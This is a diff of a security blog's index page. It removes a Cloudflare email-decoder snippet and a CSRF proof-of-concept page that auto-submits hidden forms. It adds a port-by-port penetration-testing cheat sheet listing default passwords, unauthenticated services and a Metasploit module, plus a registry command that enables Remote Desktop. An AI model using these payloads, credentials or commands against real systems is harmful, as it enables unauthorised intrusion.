@@ -238,199 +238,6 @@
             
               
                 
-                <a class="post-title-link" href="/2016/06/01/Cloudflare-Email-Protection-Decoder/" itemprop="url">
-                  Cloudflare Email Protection Decoder
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
-            <time itemprop="dateCreated" datetime="2016-06-01T16:06:05+08:00" content="2016-06-01">
-              2016-06-01
-            </time>
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h3 id="Encode-Code"><a href="#Encode-Code" class="headerlink" title="Encode Code"></a>Encode Code</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;__cf_email__&quot; href=&quot;http://cloudflare.com/email-protection.html&quot; class=&quot;f091809582839f9eb080999e97848582849c95de939f9d&quot;&gt;[email protected]&lt;/a&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">/* &lt;!--[CDATA[ */</span><br><span class="line">(function() &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        var s, a, i, j, r, c, l = document.getElementById(&quot;__cf_email__&quot;);</span><br><span class="line">        a = l.className;</span><br><span class="line">        if (a) &#123;</span><br><span class="line">            s = &apos;&apos;;</span><br><span class="line">            r = parseInt(a.substr(0, 2), 16);</span><br><span class="line">            for (j = 2; a.length - j; j += 2) &#123;</span><br><span class="line">                c = parseInt(a.substr(j, 2), 16) ^ r;</span><br><span class="line">                s += String.fromCharCode(c);</span><br><span class="line">            &#125;</span><br><span class="line">            s = document.createTextNode(s);</span><br><span class="line">            l.parentNode.replaceChild(s, l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch(e) &#123;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line">/* ]]--&gt; */</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/06/01/Cloudflare-Email-Protection-Decoder/#more" rel="contents">
-              Weiterlesen &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/05/31/Multi-CSRF-POC/" itemprop="url">
-                  Multi CSRF POC
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
-            <time itemprop="dateCreated" datetime="2016-05-31T17:43:35+08:00" content="2016-05-31">
-              2016-05-31
-            </time>
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="CSRF-POC"><a href="#CSRF-POC" class="headerlink" title="CSRF POC"></a>CSRF POC</h3><blockquote>
-<p>请求两次CSRF达到最终效果，POST–&gt;first.php–&gt;second.php</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;form1&quot; target=&apos;csrfIframe1&apos; action=&quot;http://blog.safebuff.com/first.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;小乐天&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;form id=&quot;form2&quot; target=&apos;csrfIframe2&apos; action=&quot;http://blog.safebuff.com/second.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;sec&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.onload = function() &#123;</span><br><span class="line">        document.getElementById(&quot;form1&quot;).submit();</span><br><span class="line"> 	    document.getElementById(&quot;form2&quot;).submit();</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;iframe style=&quot;display: hidden&quot; height=&quot;0&quot; width=&quot;0&quot; frameborder=&quot;0&quot; name=&quot;csrfIframe1&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe style=&quot;display: hidden&quot; height=&quot;0&quot; width=&quot;0&quot; frameborder=&quot;0&quot; name=&quot;csrfIframe2&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
                 <a class="post-title-link" href="/2016/05/31/Bypass-input-hidden-XSS/" itemprop="url">
                   Bypass input hidden XSS
                 </a>
@@ -1200,6 +1007,197 @@
 
 
     
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/05/15/Port-Hacking/" itemprop="url">
+                  Port Hacking
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-05-15T22:59:16+08:00" content="2016-05-15">
+              2016-05-15
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">Port    information</span><br><span class="line">21      ftp  主要看是否支持匿名，也可以跑弱口令</span><br><span class="line">22      ssh</span><br><span class="line">23      telnet</span><br><span class="line">79      Finger</span><br><span class="line">80      web  常见web漏洞以及是否为一些管理后台</span><br><span class="line">111     rpcinfo</span><br><span class="line">161     snmp</span><br><span class="line">389     LDAP</span><br><span class="line">873     rsync</span><br><span class="line">443     openssl  心脏滴血以及一些web漏洞测试</span><br><span class="line">873     rsync  主要看是否支持匿名，也可以跑弱口令</span><br><span class="line">1099    rmi协议</span><br><span class="line">1433    mssql</span><br><span class="line">1521    oracle</span><br><span class="line">1900    bes默认管理后台</span><br><span class="line">2082    cpanel主机管理系统登陆 （国外用较多）</span><br><span class="line">2083    cpanel主机管理系统登陆 （国外用较多） </span><br><span class="line">2181    zookeeper 未配置权限</span><br><span class="line">2182    zookeeper 未配置权限</span><br><span class="line">2222    DA虚拟主机管理系统登陆 （国外用较多） </span><br><span class="line">2375    docker  未授权访问,Web页面访问http://host:2375/containers/json   &gt;docker -H tcp://host:2375 ps</span><br><span class="line">2601    zebra路由，默认密码zebra</span><br><span class="line">2604    zebra路由，默认密码zebra</span><br><span class="line">3000    Webrick(Ruby Webserver)</span><br><span class="line">3128    squid代理默认端口，如果没设置口令很可能就直接漫游内网了</span><br><span class="line">3306    mysql</span><br><span class="line">3311    kangle主机管理系统登陆 初始用户密码admin/kangle</span><br><span class="line">3312    kangle主机管理系统登陆</span><br><span class="line">5432    postgresql</span><br><span class="line">3389    mstsc</span><br><span class="line">4440    rundeck  参考WooYun: 借用新浪某服务成功漫游新浪内网</span><br><span class="line">5984    CouchDB数据库未授权访问漏洞 http://host:5984/_utils/</span><br><span class="line">6082    varnish  参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网</span><br><span class="line">6379    redis 一般无认证，可直接访问</span><br><span class="line">7001    Weblogic</span><br><span class="line">7002    Weblogic</span><br><span class="line">7474    Neo4j</span><br><span class="line">8000-9090  Web端口</span><br><span class="line">8000    海康威视    admin/12345</span><br><span class="line">8089    jboss端口 历史曾经爆漏洞/可弱口令</span><br><span class="line">8098    Riak</span><br><span class="line">9000    Hbase</span><br><span class="line">9200    elasticsearch   remote code execution</span><br><span class="line">6082    varnish</span><br><span class="line">7001    weblogic</span><br><span class="line">8080    tomcat</span><br><span class="line">8080    tomcat默认tomcat/tomcat WDCP主机管理系统admin/wdlinux.cn root/wdlinux.cn</span><br><span class="line">8888    amh/LuManager 主机管理系统默认端口</span><br><span class="line">8083    Vestacp主机管理系统 （国外用较多）</span><br><span class="line">7778    Kloxo主机控制面板登录 </span><br><span class="line">10000   Virtualmin/Webmin 服务器虚拟主机管理系统</span><br><span class="line">11211   memcache 未授权访问</span><br><span class="line">27017   mongodb 未授权访问</span><br><span class="line">28017   mongodb统计页面</span><br><span class="line">20880   dubbo未授权访问</span><br><span class="line">50070   hadoop默认端口未授权访问</span><br><span class="line">50000   SAP命令执行</span><br><span class="line">50070   hadoop默认端口未授权访问</span><br><span class="line">53413   Netcore(Netis)路由器UDP后门 msf&gt; exploits/linux/misc/netcore_udp_53413_backdoor</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/05/15/Windows-Server-How-to-Open-Remote-DeskTop-CMD/" itemprop="url">
+                  Windows Server How to Open Remote DeskTop CMD
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-05-15T14:21:04+08:00" content="2016-05-15">
+              2016-05-15
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h3 id="Win2003-Server"><a href="#Win2003-Server" class="headerlink" title="Win2003 Server"></a>Win2003 Server</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+<h3 id="Win2008-2012-Server"><a href="#Win2008-2012-Server" class="headerlink" title="Win2008/2012 Server"></a>Win2008/2012 Server</h3>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/05/15/Windows-Server-How-to-Open-Remote-DeskTop-CMD/#more" rel="contents">
+              Weiterlesen &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
   </section>
 
   
@@ -1245,7 +1243,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">43</span>
+              <span class="site-state-item-count">41</span>
               <span class="site-state-item-name">Artikel</span>
             </a>
           </div>
